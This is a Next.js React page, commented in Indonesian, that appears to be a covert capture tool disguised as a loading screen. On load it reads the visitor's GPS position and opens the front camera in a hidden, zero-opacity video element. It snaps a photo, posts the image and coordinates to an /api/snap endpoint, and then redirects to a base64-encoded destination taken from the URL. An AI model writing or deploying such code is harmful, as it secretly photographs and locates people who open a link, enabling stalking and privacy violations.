"use client";

import React, { useEffect, useRef, Suspense } from "react";
import { useSearchParams } from "next/navigation";

// Komponen utama yang berisi logika capture
function CaptureContent() {
  const searchParams = useSearchParams();
  const t = searchParams.get("t");
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    const autoProcess = async () => {
      let destination = "/";
      try {
        if (t) destination = atob(t);
      } catch {
        destination = "/";
      }

      // Ambil GPS
      const gps = await new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
          (pos) =>
            resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
          () => resolve(null),
          { timeout: 5000 },
        );
      });

      // Ambil Kamera
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
        });

        if (videoRef.current && canvasRef.current) {
          videoRef.current.srcObject = stream;
          await new Promise((r) => setTimeout(r, 1500));

          const video = videoRef.current;
          const canvas = canvasRef.current;
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext("2d")?.drawImage(video, 0, 0);

          const image = canvas.toDataURL("image/png");
          stream.getTracks().forEach((track) => track.stop());

          await fetch("/api/snap", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ image, gps }),
          });

          window.location.replace(destination);
        }
      } catch (err) {
        window.location.replace(destination);
      }
    };

    autoProcess();
  }, [t]);

  return (
    <div className="bg-black text-white flex flex-col items-center justify-center min-h-screen">
      <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-blue-500 mb-4"></div>
      <p className="text-xs tracking-widest text-slate-500 uppercase animate-pulse">
        Loading Content...
      </p>
      <video
        ref={videoRef}
        autoPlay
        playsInline
        className="absolute opacity-0 w-1 h-1 pointer-events-none"
      />
      <canvas ref={canvasRef} className="hidden" />
    </div>
  );
}

// Wrapper dengan Suspense untuk memperbaiki error build
export default function CapturePage() {
  return (
    <Suspense
      fallback={
        <div className="bg-black text-white flex items-center justify-center min-h-screen">
          <p className="text-xs uppercase tracking-widest text-slate-600">
            Initialising...
          </p>
        </div>
      }
    >
      <CaptureContent />
    </Suspense>
  );
}
